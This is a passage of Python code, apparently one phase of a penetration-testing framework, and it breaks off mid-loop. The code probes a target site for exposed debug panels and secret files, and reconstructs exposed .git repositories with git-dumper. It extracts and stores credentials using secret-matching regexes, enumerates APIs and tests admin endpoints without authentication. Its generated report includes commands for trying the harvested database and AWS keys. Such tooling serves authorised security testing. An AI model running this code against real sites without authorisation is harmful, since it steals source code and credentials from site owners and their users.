**Phase 21 — API Security, Info Disclosure & Git Reconstruction**

  Comprehensive phase combining: REST API discovery & security testing, sensitive file/path
  disclosure, .git repository reconstruction with secret extraction, JS endpoint/secret
  scanning, and Spring Actuator/debug panel exposure. All findings saved with full evidence.

  ```python
  import time, json, re, os, subprocess
  from urllib.parse import urljoin, urlparse
  from datetime import datetime

  BASE        = _G['BASE']
  SESSION_DIR = _G['SESSION_DIR']
  session     = _G.get('session_a') or _G.get('session')
  session_b   = _G.get('session_b')
  ALL_LINKS   = _G.get('ALL_LINKS', set())
  AUTH_PAGES  = _G.get('AUTH_PAGES', {})
  ALL_PAGES   = _G.get('ALL_PAGES', {})

  _phase_findings = []
  _git_found      = False

  # ── Evidence directory ─────────────────────────────────────────────────────
  EVIDENCE_DIR = os.path.join(SESSION_DIR, 'api_evidence')
  os.makedirs(EVIDENCE_DIR, exist_ok=True)

  def save_evidence(label, url, response, extra=''):
      safe = re.sub(r'[^\w\-]', '_', label)[:80]
      fpath = os.path.join(EVIDENCE_DIR, f'{safe}.txt')
      with open(fpath, 'w') as f:
          f.write(f'URL: {url}\nStatus: {response.status_code}\n')
          f.write(f'Content-Type: {response.headers.get("Content-Type","")}\n')
          f.write(f'Size: {len(response.content)} bytes\n')
          if extra:
              f.write(f'Notes: {extra}\n')
          f.write(f'\n{"="*60}\nHEADERS:\n')
          for k, v in response.headers.items():
              f.write(f'  {k}: {v}\n')
          f.write(f'\nBODY:\n{response.text[:50000]}')
      return fpath

  def find_secrets(text):
      """Scan text for credentials and API keys. Returns list of (label, value)."""
      SECRET_RE = [
          (r'(?i)password\s*[=:]\s*[^\s\n\'"]{4,}',          'Password'),
          (r'(?i)passwd\s*[=:]\s*[^\s\n\'"]{4,}',            'Password'),
          (r'(?i)db_pass(?:word)?\s*[=:]\s*[^\s\n\'"]{4,}',  'DB Password'),
          (r'AKIA[0-9A-Z]{16}',                               'AWS Access Key'),
          (r'(?i)aws_secret_access_key\s*[=:]\s*[A-Za-z0-9+/]{40}', 'AWS Secret'),
          (r'(?i)api[_-]?key\s*[=:]\s*[\'"]?([A-Za-z0-9_\-]{16,})', 'API Key'),
          (r'(?i)secret[_-]?key\s*[=:]\s*[\'"]?([A-Za-z0-9_\-]{16,})', 'Secret Key'),
          (r'sk-[A-Za-z0-9]{32,}',                           'OpenAI Key'),
          (r'(?i)stripe[_-]?secret\s*[=:]\s*[\'"]?(sk_live_[A-Za-z0-9]{24,})', 'Stripe Secret'),
          (r'ya29\.[A-Za-z0-9_\-]+',                         'Google OAuth Token'),
          (r'(?i)(mysql|postgresql|mongodb|redis)://[^\s\'"]+', 'DB Connection String'),
          (r'(?i)smtp_pass(?:word)?\s*[=:]\s*[^\s\n\'"]{4,}', 'SMTP Password'),
          (r'(?i)private[_-]?key\s*[=:]\s*[^\s\n\'"]{16,}', 'Private Key'),
          (r'(?i)access[_-]?token\s*[=:]\s*[^\s\n\'"]{16,}', 'Access Token'),
          (r'(?i)auth[_-]?token\s*[=:]\s*[^\s\n\'"]{16,}',  'Auth Token'),
          (r'(?i)bearer\s+[A-Za-z0-9_\-\.]{20,}',           'Bearer Token'),
          (r'ghp_[A-Za-z0-9]{36}',                           'GitHub Personal Token'),
          (r'ghs_[A-Za-z0-9]{36}',                           'GitHub Service Token'),
          (r'(?i)(facebook|fb)[_-]?(app[_-]?secret|access[_-]?token)\s*[=:]\s*[\'"]?([A-Za-z0-9]{16,})', 'Facebook Key'),
          (r'(?i)twilio[_-]?(auth[_-]?token|account[_-]?sid)\s*[=:]\s*[\'"]?([A-Za-z0-9]{16,})', 'Twilio Credential'),
          (r'(?i)sendgrid[_-]?api[_-]?key\s*[=:]\s*[\'"]?SG\.[A-Za-z0-9_\-]{22,}', 'SendGrid Key'),
      ]
      hits = []
      for pat, label in SECRET_RE:
          for m in re.finditer(pat, text):
              val = m.group(0)
              if val.lower() not in ['password', 'secret', 'changeme', 'example', 'your_key']:
                  hits.append((label, val[:150]))
      return hits

  print('='*60)
  print('PHASE 21 — API SECURITY, INFO DISCLOSURE & GIT RECONSTRUCTION')
  print('='*60)

  # ══════════════════════════════════════════════════════════════
  # SECTION 1 — API Documentation & Debug Panel Discovery
  # ══════════════════════════════════════════════════════════════
  print('\n[1/6] API docs, actuator and debug panels...')

  DOC_PATHS = [
      ('/swagger.json',                      'Swagger JSON',           'MEDIUM'),
      ('/swagger-ui.html',                   'Swagger UI',             'MEDIUM'),
      ('/swagger-ui/',                       'Swagger UI',             'MEDIUM'),
      ('/api-docs',                          'API Docs',               'MEDIUM'),
      ('/api-docs.json',                     'API Docs JSON',          'MEDIUM'),
      ('/v1/api-docs',                       'API Docs v1',            'MEDIUM'),
      ('/v2/api-docs',                       'API Docs v2',            'MEDIUM'),
      ('/openapi.json',                      'OpenAPI Spec',           'MEDIUM'),
      ('/openapi.yaml',                      'OpenAPI YAML',           'MEDIUM'),
      ('/api/openapi.json',                  'API OpenAPI',            'MEDIUM'),
      ('/api/swagger.json',                  'API Swagger',            'MEDIUM'),
      ('/docs',                              'API Docs',               'MEDIUM'),
      ('/redoc',                             'ReDoc UI',               'MEDIUM'),
      ('/graphiql',                          'GraphiQL IDE',           'MEDIUM'),
      ('/playground',                        'GraphQL Playground',     'MEDIUM'),
      ('/actuator',                          'Spring Actuator',        'HIGH'),
      ('/actuator/health',                   'Actuator Health',        'LOW'),
      ('/actuator/info',                     'Actuator Info',          'LOW'),
      ('/actuator/env',                      'Actuator Env (secrets)', 'CRITICAL'),
      ('/actuator/configprops',              'Actuator Config Props',  'CRITICAL'),
      ('/actuator/beans',                    'Actuator Beans',         'HIGH'),
      ('/actuator/mappings',                 'Actuator Mappings',      'HIGH'),
      ('/actuator/httptrace',                'Actuator HTTP Trace',    'HIGH'),
      ('/actuator/heapdump',                 'Actuator Heap Dump',     'CRITICAL'),
      ('/actuator/dump',                     'Actuator Thread Dump',   'HIGH'),
      ('/__debug__/',                        'Django Debug Toolbar',   'CRITICAL'),
      ('/telescope',                         'Laravel Telescope',      'HIGH'),
      ('/telescope/requests',                'Laravel Telescope',      'HIGH'),
      ('/horizon',                           'Laravel Horizon',        'HIGH'),
      ('/clockwork',                         'Clockwork Debugger',     'HIGH'),
      ('/debugbar',                          'PHP DebugBar',           'HIGH'),
      ('/phpinfo.php',                       'PHP Info',               'CRITICAL'),
      ('/info.php',                          'PHP Info',               'CRITICAL'),
      ('/test.php',                          'PHP Test File',          'HIGH'),
      ('/server-status',                     'Apache Server-Status',   'HIGH'),
      ('/server-info',                       'Apache Server-Info',     'HIGH'),
      ('/nginx_status',                      'Nginx Status',           'MEDIUM'),
      ('/metrics',                           'Prometheus Metrics',     'MEDIUM'),
      ('/health',                            'Health Endpoint',        'LOW'),
      ('/status',                            'Status Page',            'LOW'),
  ]

  discovered_endpoints = []
  for path, desc, sev in DOC_PATHS:
      url = urljoin(BASE, path)
      time.sleep(0.15)
      try:
          r = session.get(url, timeout=8, allow_redirects=True)
          if r.status_code == 200 and len(r.text.strip()) > 50:
              body = r.text
              if '<app-root' in body or '<div id="root"' in body:
                  continue
              is_real = False
              if 'swagger' in body.lower() or 'openapi' in body.lower():
                  is_real = True
                  # Extract endpoints from spec
                  try:
                      spec = r.json()
                      for ep_path in spec.get('paths', {}):
                          discovered_endpoints.append(ep_path)
                      print(f'    Extracted {len(spec.get("paths",{}))} endpoints from spec')
                  except Exception:
                      pass
              elif 'actuator' in path and ('"status"' in body or '"beans"' in body or '"activeProfiles"' in body):
                  is_real = True
              elif 'phpinfo' in path and 'PHP Version' in body:
                  is_real = True
              elif 'graphiql' in path or 'playground' in path:
                  is_real = True
              elif 'telescope' in path and ('requests' in body.lower() or 'laravel' in body.lower()):
                  is_real = True
              elif 'server-status' in path and ('requests currently being processed' in body.lower() or 'Apache' in body):
                  is_real = True
              elif 'metrics' in path and ('# HELP' in body or 'process_' in body):
                  is_real = True
              elif path in ('/health', '/status') and (r.headers.get('Content-Type','').startswith('application/json')):
                  is_real = True

              if is_real:
                  secrets = find_secrets(body)
                  ef = save_evidence(f'doc_{path.strip("/").replace("/","_")}', url, r,
                                     extra=f'Secrets: {secrets[:3]}')
                  print(f'  [{sev}] {desc}: {url} ({len(body)} bytes)')
                  if secrets:
                      for label, val in secrets[:3]:
                          print(f'    SECRET [{label}]: {val[:80]}')
                  _phase_findings.append({
                      'severity': 'CRITICAL' if secrets else sev,
                      'title': f'{desc} Exposed',
                      'url': url, 'method': 'GET', 'screenshot': '',
                      'evidence': f'HTTP 200. Secrets: {[s[0] for s in secrets]}. Preview: {body[:200]}',
                      'impact': f'{"Credentials/secrets exposed. " if secrets else ""}{desc} accessible without authentication.',
                      'poc': f'curl -s {url}',
                      'evidence_file': ef,
                  })
          elif r.status_code in (401, 403):
              if 'actuator' in path or 'phpinfo' in path:
                  print(f'  [INFO] {desc} exists but protected ({r.status_code}): {url}')
      except Exception:
          continue

  # ══════════════════════════════════════════════════════════════
  # SECTION 2 — Sensitive File & Path Disclosure
  # ══════════════════════════════════════════════════════════════
  print('\n[2/6] Sensitive files and path disclosure...')

  SENSITIVE_FILES = [
      # Secrets & environment
      ('/.env',                         'Environment File',       'CRITICAL'),
      ('/.env.local',                   'Local Env File',         'CRITICAL'),
      ('/.env.production',              'Production Env File',    'CRITICAL'),
      ('/.env.staging',                 'Staging Env File',       'CRITICAL'),
      ('/.env.backup',                  'Env Backup',             'CRITICAL'),
      ('/config.json',                  'Config JSON',            'HIGH'),
      ('/config.php',                   'Config PHP',             'HIGH'),
      ('/config.yml',                   'Config YAML',            'HIGH'),
      ('/config.yaml',                  'Config YAML',            'HIGH'),
      ('/configuration.php',            'Joomla Config',          'HIGH'),
      ('/wp-config.php',                'WordPress Config',       'CRITICAL'),
      ('/wp-config.php.bak',            'WordPress Config Backup','CRITICAL'),
      ('/settings.py',                  'Django Settings',        'HIGH'),
      ('/local_settings.py',            'Django Local Settings',  'CRITICAL'),
      ('/database.yml',                 'Rails DB Config',        'CRITICAL'),
      ('/secrets.yml',                  'Rails Secrets',          'CRITICAL'),
      ('/application.properties',       'Spring Properties',      'HIGH'),
      ('/application.yml',              'Spring Config',          'HIGH'),
      ('/appsettings.json',             'ASP.NET Settings',       'HIGH'),
      # VCS exposure
      ('/.git/HEAD',                    'Git Repository',         'CRITICAL'),
      ('/.git/config',                  'Git Config',             'CRITICAL'),
      ('/.git/COMMIT_EDITMSG',          'Git Commit Message',     'HIGH'),
      ('/.gitignore',                   'Gitignore',              'LOW'),
      ('/.svn/entries',                 'SVN Repository',         'HIGH'),
      ('/.hg/store/00manifest.i',       'Mercurial Repo',         'HIGH'),
      # Node / JS
      ('/package.json',                 'Package JSON',           'LOW'),
      ('/package-lock.json',            'Package Lock',           'LOW'),
      ('/.npmrc',                       'NPM Config',             'HIGH'),
      ('/.yarnrc',                      'Yarn Config',            'MEDIUM'),
      ('/yarn.lock',                    'Yarn Lock',              'LOW'),
      # PHP / Ruby / Python
      ('/composer.json',                'Composer JSON',          'LOW'),
      ('/composer.lock',                'Composer Lock',          'LOW'),
      ('/requirements.txt',             'Python Requirements',    'LOW'),
      ('/Gemfile',                      'Ruby Gemfile',           'LOW'),
      ('/Gemfile.lock',                 'Gemfile Lock',           'LOW'),
      ('/Pipfile',                      'Pipfile',                'LOW'),
      # Infrastructure
      ('/Dockerfile',                   'Dockerfile',             'MEDIUM'),
      ('/docker-compose.yml',           'Docker Compose',         'MEDIUM'),
      ('/docker-compose.yaml',          'Docker Compose',         'MEDIUM'),
      ('/.dockerenv',                   'Docker Env Marker',      'MEDIUM'),
      ('/Makefile',                     'Makefile',               'LOW'),
      ('/Vagrantfile',                  'Vagrantfile',            'LOW'),
      # Logs
      ('/storage/logs/laravel.log',     'Laravel Log',            'HIGH'),
      ('/app/storage/logs/laravel.log', 'Laravel Log',            'HIGH'),
      ('/log/development.log',          'Rails Dev Log',          'HIGH'),
      ('/logs/error.log',               'Error Log',              'HIGH'),
      ('/application.log',              'Application Log',        'HIGH'),
      ('/debug.log',                    'Debug Log',              'HIGH'),
      ('/error.log',                    'Error Log',              'HIGH'),
      # Backups / DB dumps
      ('/backup.sql',                   'SQL Backup',             'CRITICAL'),
      ('/dump.sql',                     'SQL Dump',               'CRITICAL'),
      ('/database.sql',                 'Database Dump',          'CRITICAL'),
      ('/db.sql',                       'DB Dump',                'CRITICAL'),
      ('/db.sqlite',                    'SQLite Database',        'CRITICAL'),
      ('/db.sqlite3',                   'SQLite Database',        'CRITICAL'),
      ('/backup.zip',                   'Backup Archive',         'CRITICAL'),
      ('/site.zip',                     'Site Archive',           'CRITICAL'),
      ('/www.zip',                      'WWW Archive',            'CRITICAL'),
      # Server config
      ('/.htpasswd',                    'Apache Password File',   'CRITICAL'),
      ('/.htaccess',                    'Apache Config',          'MEDIUM'),
      ('/web.config',                   'IIS Config',             'HIGH'),
      ('/WEB-INF/web.xml',              'Java WEB-INF',           'HIGH'),
      ('/crossdomain.xml',              'Flash Cross-domain',     'LOW'),
      ('/clientaccesspolicy.xml',       'Silverlight Policy',     'LOW'),
      # macOS / Windows artifacts
      ('/.DS_Store',                    'macOS DS_Store',         'LOW'),
      ('/Thumbs.db',                    'Windows Thumbs.db',      'LOW'),
  ]

  for path, desc, default_sev in SENSITIVE_FILES:
      url = urljoin(BASE, path)
      time.sleep(0.15)
      try:
          r = session.get(url, timeout=8, allow_redirects=False)
          if r.status_code == 200 and len(r.text.strip()) > 10:
              body = r.text
              ct   = r.headers.get('Content-Type', '')

              # Skip SPA catch-all
              if '<app-root' in body or '<div id="root"' in body:
                  continue
              if len(body) > 400000:
                  continue

              # Validate it's real content
              is_real = False
              if '.git/HEAD' in path:
                  if body.strip().startswith('ref:') or (len(body.strip()) == 40 and body.strip().isalnum()):
                      is_real = True
                      _git_found = True
              elif '.git/config' in path and '[core]' in body:
                  is_real = True
                  _git_found = True
              elif '.env' in path and '=' in body and len(body) < 200000:
                  is_real = True
              elif path.endswith('.json') and body.strip().startswith(('{', '[')):
                  is_real = True
              elif path.endswith(('.yml', '.yaml')) and ':' in body:
                  is_real = True
              elif path.endswith(('.txt', '.lock', 'Gemfile', 'Dockerfile',
                                   'Makefile', 'Pipfile', 'Vagrantfile')):
                  is_real = True
              elif '.sql' in path and ('CREATE TABLE' in body or 'INSERT INTO' in body or 'SELECT' in body[:200]):
                  is_real = True
              elif '.sqlite' in path or '.db' in path:
                  is_real = len(r.content) > 100
              elif '.zip' in path and 'application/' in ct:
                  is_real = True
              elif '.htpasswd' in path and re.search(r'\$\w+\$', body):
                  is_real = True
              elif path.endswith('.log') and ('Exception' in body or 'Error' in body or 'Warning' in body):
                  is_real = True
              elif 'application.properties' in path and '=' in body:
                  is_real = True
              elif 'appsettings' in path and body.strip().startswith('{'):
                  is_real = True
              elif 'text/html' not in ct and len(body) < 500000:
                  is_real = True

              if not is_real:
                  continue

              secrets = find_secrets(body)
              sev = 'CRITICAL' if secrets else default_sev

              ef = save_evidence(f'file_{path.strip("/").replace("/","_")}', url, r,
                                 extra=f'Secrets: {[(l,v[:60]) for l,v in secrets[:5]]}')
              print(f'  [{sev}] {desc}: {url} ({len(body)} bytes)')
              for label, val in secrets[:5]:
                  print(f'    SECRET [{label}]: {val[:80]}')
              if secrets:
                  print(f'    Evidence: {ef}')

              _phase_findings.append({
                  'severity': sev,
                  'title': f'{desc} Exposed',
                  'url': url, 'method': 'GET', 'screenshot': '',
                  'evidence': f'HTTP 200, {len(body)} bytes. Secrets: {[(l,v[:60]) for l,v in secrets[:3]]}. Preview: {body[:300]}',
                  'impact': f'{"CREDENTIALS EXPOSED — rotate immediately. " if secrets else ""}Sensitive file publicly accessible without authentication.',
                  'poc': f'curl -s {url}',
                  'evidence_file': ef,
              })
          elif r.status_code in (401, 403):
              if any(k in path for k in ['.env', '.git', 'htpasswd', 'wp-config', 'actuator']):
                  print(f'  [INFO] Protected ({r.status_code}): {url}')
      except Exception:
          continue

  # ══════════════════════════════════════════════════════════════
  # SECTION 3 — .git Repository Reconstruction
  # ══════════════════════════════════════════════════════════════
  if _git_found:
      print(f'\n[3/6] .git FOUND — reconstructing repository...')

      GIT_DUMP_DIR = os.path.join(SESSION_DIR, 'git_dump')
      os.makedirs(GIT_DUMP_DIR, exist_ok=True)
      _G['GIT_EXPOSED']  = True
      _G['GIT_DUMP_DIR'] = GIT_DUMP_DIR

      # Fetch additional git metadata
      GIT_META_FILES = [
          '.git/HEAD', '.git/config', '.git/COMMIT_EDITMSG',
          '.git/logs/HEAD', '.git/packed-refs',
          '.git/refs/heads/main', '.git/refs/heads/master',
          '.git/refs/remotes/origin/HEAD',
      ]
      git_meta = {}
      for gf in GIT_META_FILES:
          try:
              r = session.get(f'{BASE}/{gf}', timeout=8, allow_redirects=False)
              if r.status_code == 200 and r.text.strip():
                  git_meta[gf] = r.text
          except Exception:
              pass
          time.sleep(0.1)

      # Extract remote URL
      remote_url = None
      if '.git/config' in git_meta:
          m = re.search(r'url\s*=\s*(.+)', git_meta['.git/config'])
          if m:
              remote_url = m.group(1).strip()
              print(f'  [CRITICAL] Remote URL leaked: {remote_url}')

      # Run git-dumper
      print(f'  Running git-dumper to reconstruct source code...')
      try:
          result = subprocess.run(
              ['git-dumper', f'{BASE}/.git', GIT_DUMP_DIR],
              capture_output=True, text=True, timeout=300
          )
          print(f'  Return code: {result.returncode}')
          if result.stdout:
              print(f'  {result.stdout[:300]}')
      except subprocess.TimeoutExpired:
          print('  [WARN] git-dumper timed out after 5 minutes')
      except Exception as e:
          print(f'  [ERR] git-dumper: {e}')

      # List reconstructed files
      dumped_files = []
      for root, dirs, files in os.walk(GIT_DUMP_DIR):
          for f in files:
              if '.git' not in root:
                  dumped_files.append(os.path.join(root, f))
      _G['GIT_DUMPED_FILES'] = dumped_files
      print(f'  Reconstructed {len(dumped_files)} source files')

      # Scan ALL reconstructed source files for secrets
      SCAN_EXTS = {'.env', '.php', '.py', '.js', '.rb', '.config', '.yml', '.yaml',
                   '.json', '.xml', '.ini', '.conf', '.txt', '.sh', '.java', '.go',
                   '.ts', '.tsx', '.jsx', '.properties', '.toml', '.lock', '.gradle'}
      PRIORITY = {'.env', 'wp-config.php', 'settings.py', 'database.yml',
                  'secrets.yml', 'config.php', 'application.properties', '.npmrc'}

      all_git_secrets = []
      sensitive_file_contents = {}

      def file_sort_key(fp):
          return 0 if os.path.basename(fp) in PRIORITY else 1

      for fpath in sorted(dumped_files, key=file_sort_key):
          ext = os.path.splitext(fpath)[1].lower()
          fname = os.path.basename(fpath)
          if ext not in SCAN_EXTS and fname not in PRIORITY:
              continue
          try:
              with open(fpath, 'r', errors='ignore') as f:
                  content = f.read()
          except Exception:
              continue

          rel = fpath.replace(GIT_DUMP_DIR, '')
          hits = find_secrets(content)
          # Filter placeholders
          hits = [(l, v) for l, v in hits
                  if v.lower() not in ['password','secret','changeme','example','your_key','xxxx']]

          if hits:
              print(f'\n  [{len(hits)} secrets] {rel}')
              for label, val in hits[:5]:
                  print(f'    [{label}] {val[:100]}')
              all_git_secrets.extend([{'file': rel, 'label': l, 'value': v} for l, v in hits])
              sensitive_file_contents[rel] = content[:3000]

      _G['GIT_SECRETS'] = all_git_secrets
      print(f'\n  Total secrets extracted from git: {len(all_git_secrets)}')

      # Save secrets JSON
      secrets_json = os.path.join(SESSION_DIR, 'git_secrets.json')
      with open(secrets_json, 'w') as f:
          json.dump({
              'target': BASE, 'remote_url': remote_url,
              'files_reconstructed': len(dumped_files),
              'secrets_count': len(all_git_secrets),
              'secrets': all_git_secrets,
          }, f, indent=2)
      print(f'  Secrets JSON: {secrets_json}')

      # Generate Markdown disclosure report
      report_md = os.path.join(SESSION_DIR, 'git_disclosure_report.md')
      lines = [
          f'# Git Repository Exposure — Master Disclosure Report',
          f'', f'**Target:** {BASE}', f'**Date:** {datetime.now().strftime("%Y-%m-%d %H:%M UTC")}',
          f'**Severity:** CRITICAL', f'', f'---', f'',
          f'## 1. Executive Summary', f'',
          f'The `.git/` directory of `{BASE}` is publicly accessible. '
          f'{len(dumped_files)} source files were reconstructed and {len(all_git_secrets)} credentials extracted.',
          f'', f'---', f'',
          f'## 2. Exploit Path', f'',
          f'```',
          f'Step 1: Confirm .git/HEAD accessible',
          f'  GET {BASE}/.git/HEAD => {git_meta.get(".git/HEAD","ref: refs/heads/main").strip()[:60]}',
          f'',
          f'Step 2: Extract git config',
          f'  GET {BASE}/.git/config => remote url: {remote_url or "N/A"}',
          f'',
          f'Step 3: Reconstruct repository',
          f'  git-dumper {BASE}/.git ./git_dump/',
          f'  Result: {len(dumped_files)} files',
          f'',
          f'Step 4: Extract secrets',
          f'  grep -r "password\\|api_key\\|secret" ./git_dump/',
          f'  Result: {len(all_git_secrets)} secrets',
          f'```', f'', f'---', f'',
          f'## 3. Remote Repository', f'',
          f'```', f'{remote_url or "Not found"}', f'```', f'', f'---', f'',
          f'## 4. Confirmed Secrets', f'',
      ]

      for sev_label in ['Password', 'DB Password', 'AWS Access Key', 'AWS Secret',
                         'API Key', 'Secret Key', 'Private Key', 'DB Connection String',
                         'Auth Token', 'Bearer Token', 'GitHub Personal Token']:
          group = [s for s in all_git_secrets if s['label'] == sev_label]
          if not group:
              continue
          lines += [f'### {sev_label} ({len(group)} found)', f'',
                    f'| Value | File |', f'|-------|------|']
          for s in group[:10]:
              lines.append(f'| `{s["value"][:80].replace("|","\\|")}` | `{s["file"]}` |')
          lines.append(f'')

      lines += [
          f'---', f'',
          f'## 5. Reconstructed Files ({len(dumped_files)} total)', f'', f'```',
      ]
      for fp in dumped_files[:60]:
          lines.append(fp.replace(GIT_DUMP_DIR, ''))
      if len(dumped_files) > 60:
          lines.append(f'... and {len(dumped_files)-60} more')
      lines += [f'```', f'', f'---', f'', f'## 6. Key File Contents', f'']

      for rel, content in list(sensitive_file_contents.items())[:5]:
          lines += [f'### `{rel}`', f'', f'```', content[:2000], f'```', f'']

      lines += [
          f'---', f'',
          f'## 7. Verification Steps', f'',
          f'```bash',
          f'# Verify DB connection (if found)',
          f'mysql -h <host> -u <user> -p<password> -e "SELECT 1"',
          f'# Verify AWS keys',
          f'AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY=<secret> aws sts get-caller-identity',
          f'# Verify API keys against their respective services',
          f'```', f'', f'---', f'',
          f'## 8. Remediation', f'',
          f'1. **Block `.git/` immediately:**',
          f'   ```nginx', f'   location ~ /\\.git {{ deny all; return 404; }}', f'   ```',
          f'2. **Rotate ALL exposed secrets immediately**',
          f'3. **Audit access logs for prior exploitation:**',
          f'   ```bash', f'   grep "/.git" /var/log/nginx/access.log', f'   ```',
          f'4. **Remove secrets from git history** using BFG Repo Cleaner',
          f'5. **Use environment variables** — never hardcode secrets in source',
          f'', f'---',
          f'', f'*Generated by TheRobin Penetration Testing Framework*',
      ]

      with open(report_md, 'w') as f:
          f.write('\n'.join(lines))
      print(f'  Disclosure report: {report_md}')

      sev = 'CRITICAL' if all_git_secrets else 'HIGH'
      _phase_findings.append({
          'severity': sev,
          'title': 'Git Repository Exposed',
          'url': f'{BASE}/.git/HEAD',
          'method': 'GET', 'screenshot': '',
          'evidence': f'{len(dumped_files)} files reconstructed; {len(all_git_secrets)} secrets extracted. Remote: {remote_url}',
          'impact': f'Full source code theft. {"" + str(len(all_git_secrets)) + " credentials exposed — database, API, and system access at risk." if all_git_secrets else "Full app logic exposed."}',
          'poc': f'git-dumper {BASE}/.git ./dump/ && cat ./dump/.env',
          'evidence_file': report_md,
      })
  else:
      print(f'\n[3/6] .git not exposed — skipping reconstruction')

  # ══════════════════════════════════════════════════════════════
  # SECTION 4 — API Endpoint Enumeration & Excessive Data Exposure
  # ══════════════════════════════════════════════════════════════
  print(f'\n[4/6] API endpoint enumeration...')

  API_BASES = ['/api', '/api/v1', '/api/v2', '/api/v3', '/v1', '/v2', '/v3',
               '/rest', '/service', '/services', '/internal', '/private', '/backend', '']

  API_WORDS = [
      '/users', '/users/list', '/users/all', '/user', '/user/info', '/me',
      '/profile', '/profiles', '/accounts', '/account/info', '/members', '/staff',
      '/admin', '/admin/users', '/admin/dashboard', '/admin/config', '/admin/logs',
      '/token', '/tokens', '/refresh', '/auth', '/auth/token', '/session', '/sessions',
      '/config', '/configuration', '/settings', '/env', '/environment',
      '/debug', '/test', '/dev', '/info', '/version',
      '/export', '/download', '/backup', '/dump', '/data',
      '/logs', '/log', '/audit', '/events', '/activity', '/reports', '/analytics',
      '/keys', '/apikeys', '/api-keys', '/credentials', '/secrets',
      '/products', '/orders', '/customers', '/invoices', '/payments', '/transactions',
      '/files', '/uploads', '/media', '/roles', '/permissions', '/groups',
      '/internal/users', '/internal/config', '/private/users', '/private/data',
  ]

  API_ENUM_PATHS = list({f'{b}{w}' for b in API_BASES for w in API_WORDS})

  # Add from Swagger spec
  API_ENUM_PATHS += discovered_endpoints

  # Add crawled API links
  for link in ALL_LINKS:
      path = urlparse(link).path
      if '/api/' in link or '/rest/' in link:
          API_ENUM_PATHS.append(path)

  # Add crawled pages with IDs or sensitive names
  for page_url in list(AUTH_PAGES.keys()) + list(ALL_PAGES.keys()):
      path = urlparse(page_url).path
      if path:
          if re.search(r'/\d+', path):
              API_ENUM_PATHS.append(path)
          if any(s in path.lower() for s in ['user','profile','account','admin','config','export','backup']):
              API_ENUM_PATHS.append(path)

  API_ENUM_PATHS = list(set(API_ENUM_PATHS))

  SENSITIVE_FIELDS = ['password','passwd','pwd','hash','secret','token','api_key','apikey',
                      'private_key','credit_card','ssn','salary','bank_account','admin_token',
                      'session_token','refresh_token','access_token','private','is_admin','role']

  accessible_apis = []
  print(f'  Testing {min(len(API_ENUM_PATHS), 200)} API paths...')

  for path in API_ENUM_PATHS[:200]:
      url = urljoin(BASE, path)
      time.sleep(0.12)
      try:
          r = session.get(url, timeout=7, headers={'Accept': 'application/json'})
          if r.status_code in (200, 201) and len(r.text) > 20:
              if '<app-root' in r.text or '<div id="root"' in r.text:
                  continue
              try:
                  data = r.json()
                  if isinstance(data, (list, dict)):
                      data_str = json.dumps(data)
                      if len(data_str) > 50:
                          accessible_apis.append({'url': url, 'path': path, 'data': data, 'r': r})
                          exposed = [f for f in SENSITIVE_FIELDS if f in data_str.lower()]
                          if exposed:
                              ef = save_evidence(f'api_sensitive_{path.strip("/").replace("/","_")}', url, r,
                                                 extra=f'Sensitive fields: {exposed}')
                              print(f'  [HIGH] Sensitive API: {url}')
                              print(f'    Fields: {exposed}')
                              print(f'    Preview: {data_str[:150]}')
                              _phase_findings.append({
                                  'severity': 'HIGH',
                                  'title': 'API Exposes Sensitive Data',
                                  'url': url, 'method': 'GET', 'screenshot': '',
                                  'evidence': f'Fields exposed: {exposed}. Sample: {data_str[:300]}',
                                  'impact': f'API returns sensitive user/system fields: {", ".join(exposed)}',
                                  'poc': f'curl -s {url} | python3 -m json.tool',
                                  'evidence_file': ef,
                              })
                          else:
                              print(f'  [INFO] API: {url} ({len(data_str)} bytes)')
              except Exception:
                  pass
          elif r.status_code == 401:
              pass  # auth required — expected
      except Exception:
          continue

  # ══════════════════════════════════════════════════════════════
  # SECTION 5 — Admin Endpoints Without Auth & Rate Limiting
  # ══════════════════════════════════════════════════════════════
  print(f'\n[5/6] Admin auth bypass and rate limiting...')

  ADMIN_PATHS = [
      '/api/admin', '/api/admin/users', '/api/admin/settings', '/api/admin/config',
      '/api/admin/logs', '/api/users/all', '/api/v1/admin', '/api/management',
      '/api/system', '/api/internal', '/api/private',
  ]

  import requests as _req
  no_auth = _req.Session()
  no_auth.headers['User-Agent'] = session.headers.get('User-Agent', 'Mozilla/5.0')

  for path in ADMIN_PATHS:
      url = urljoin(BASE, path)
      time.sleep(0.2)
      try:
          r = no_auth.get(url, timeout=7, headers={'Accept': 'application/json'})
          if r.status_code in (200, 201):
              try:
                  data = r.json()
                  if isinstance(data, (list, dict)) and len(json.dumps(data)) > 50:
                      if 'error' not in json.dumps(data).lower()[:100]:
                          ef = save_evidence(f'admin_unauth_{path.strip("/").replace("/","_")}', url, r)
                          print(f'  [CRITICAL] Admin without auth: {url}')
                          _phase_findings.append({
                              'severity': 'CRITICAL',
                              'title': 'Admin API No Auth',
                              'url': url, 'method': 'GET', 'screenshot': '',
                              'evidence': json.dumps(data)[:400],
                              'impact': 'Administrative functionality accessible without any authentication',
                              'poc': f'curl -s {url}',
                              'evidence_file': ef,
                          })
              except Exception:
                  pass
      except Exception:
          continue

  # Rate limiting check
  if accessible_apis:
      test_url = accessible_apis[0]['url']
      success_count = sum(
          1 for _ in range(20)
          if session.get(test_url, timeout=4).status_code in (200, 201)
      )
      if success_count >= 18:
          print(f'  [MEDIUM] No rate limiting: {test_url} ({success_count}/20 rapid requests OK)')
          _phase_findings.append({
              'severity': 'MEDIUM',
              'title': 'API Missing Rate Limiting',
              'url': test_url, 'method': 'GET', 'screenshot': '',
              'evidence': f'{success_count}/20 rapid requests all HTTP 200',
              'impact': 'No throttling enables enumeration, credential stuffing, and scraping at scale',
              'poc': f'for i in $(seq 1 100); do curl -s -o /dev/null -w "%{{http_code}}\\n" {test_url}; done',
          })

  # ══════════════════════════════════════════════════════════════
  # SECTION 6 — JS Endpoint & Secret Disclosure
  # ══════════════════════════════════════════════════════════════
  print(f'\n[6/6] JS file endpoint and secret scanning...')

  js_links = [l for l in ALL_LINKS if l.endswith('.js') and 'cdn' not in l.lower()][:20]

  _js_secrets_found = []
  _js_endpoints_found = set()

  API_EP_RE = re.compile(
      r'(?:fetch|axios\.(?:get|post|put|delete|patch)|http\.(?:get|post)|'
      r'(?:get|post|put|delete|patch)\s*\()'
      r'\s*[(`\'"]([/][a-zA-Z0-9_/\-\.?&=%{}:]+)',
      re.IGNORECASE
  )

  for js_url in js_links:
      try:
